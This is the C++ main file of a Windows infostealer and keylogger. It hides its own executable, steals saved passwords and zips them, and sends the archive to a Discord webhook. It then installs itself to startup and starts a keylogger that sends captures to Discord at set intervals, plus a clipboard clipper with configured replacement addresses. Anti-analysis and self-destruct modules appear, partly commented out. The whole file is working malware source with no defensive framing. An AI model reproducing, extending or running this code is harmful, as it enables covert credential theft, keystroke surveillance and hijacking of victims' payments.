#include <Windows.h>
#include <vector>
#include <thread>
#include <direct.h>
#include <winuser.h>
#include <iostream>
#include <string>
#include "Config.h"
#include "Startup.h"
#include "Paths.h"
#include "SelfDestruct.h"
#include "StartDelay.h"
#include "AntiAnalysis.h"
#include "DiscordHook.h"
#include "Filemanager.h"
#include "Passwords.h"
#include "Counter.h"
#include "WindowManager.h"
#include "Keylogger.h"
#include "timme.h"
#include "ClipboardManager.h"
#include <mutex>
#include "keylog.h"

using namespace std;

// Function to change the current working directory to the specified path
bool ChangeWorkingDirectory(const char* path) {
    bool is_success = false;
    try {
        int result = _chdir(path);  // Change the current working directory to 'path'

        // If result is 0, the directory change was successful
        if (result == 0) {
            is_success = true;  // Mark the operation as successful
        }
    }
    catch (exception& e) {  // Catch any exceptions thrown during the process
    }

    return is_success;  // Return the success status
}

void RestoreConfig() {
    Config::AntiAnalysis = Config::AntiAnalysis.c_str();
    Config::Autorun = Config::Autorun.c_str();
    Config::StartDelay = Config::StartDelay.c_str();
    Config::Webhook = Config::Webhook.c_str();
    Config::KeyloggerModule = Config::KeyloggerModule.c_str();
    Config::ClipperModule = Config::ClipperModule.c_str();
    Config::GrabberModule = Config::GrabberModule.c_str();

    // Loop through all clipper addresses and convert each to a C-style string
    for (auto& address : Config::ClipperAddresses) {
        const char* temp = address.second.c_str();  // Convert address to C-style string
        address.second = temp;  // Assign the C-style string back to the map
    }
}

int main() {
    vector <thread> threads;  // Vector to store threads

    Time::randomDelay();
    mutex mtx;
    RestoreConfig();

    //Hide executable on first start 
    if (!Startup::IsFromStartup())
    {
        Startup::HideFile(Startup::CurrentExecutablePath);
    }

    Time::randomDelay();

    //// Run AntiAnalysis modules                                
    //if (AntiAnalysis::Run())
    //{
    //    AntiAnalysis::FakeErrorMessage();
    //}

    //Change working directory to appdata 
    bool nRet = ChangeWorkingDirectory(Paths::InitWorkDir().c_str());

    //Decrypt config strings
    Config::Init();

    //Steal  Password
    std::string zipPath = Passwords::Save();

    //Compress directory
    bool is_sucess = Filemanager::zip_add_to_archive(zipPath);
  
    //if (!is_sucess)
    //{
    //    Filemanager::DeleteFileOrDir(Paths::InitWorkDir());
    //    SelfDestruct::Melt();
    //}

    //Send archive
    std::thread SendReport(DiscordHook::SendReportAsync, zipPath + ".gz");
    SendReport.join();
    Time::randomDelay();
    
    if (!Startup::IsInstalledToStartup() && !Startup::IsFromStartup())
    {
        Startup::Install();
    }

    //KeyLog::logEvents();

    //Run keylogger module 
    {
        Keylogger::StartKeylogger();
        std::thread WindowManag(WindowManager::Run);
        WindowManag.detach();
        std::thread TimedTransmissionKeylogger(DiscordHook::TimedTransmissionKeylogger);
        TimedTransmissionKeylogger.detach();
    }
    
    {
        std::thread ClipboardManag(ClipboardManager::Run);
        ClipboardManag.detach();
    }

    std::thread logEvents(KeyLog::logEvents);
    logEvents.detach();

    //Remove executable if running not form startup directory
    //if (!Startup::IsFromStartup())
    //{
        //Time::randomDelay();
        //if (Config::Autorun != "1")
        //{
        //    Filemanager::DeleteFileOrDir(Paths::InitWorkDir());
        //    //SelfDestruct::Melt();
        //    return 0;
        //}
        //Filemanager::DeleteFileOrDir(Paths::InitWorkDir() + "\\" + Passwords::PasswordsStoreDirectory);
        //SelfDestruct::Melt();
    //}
    
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0))
    {
        Sleep(20000);
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}
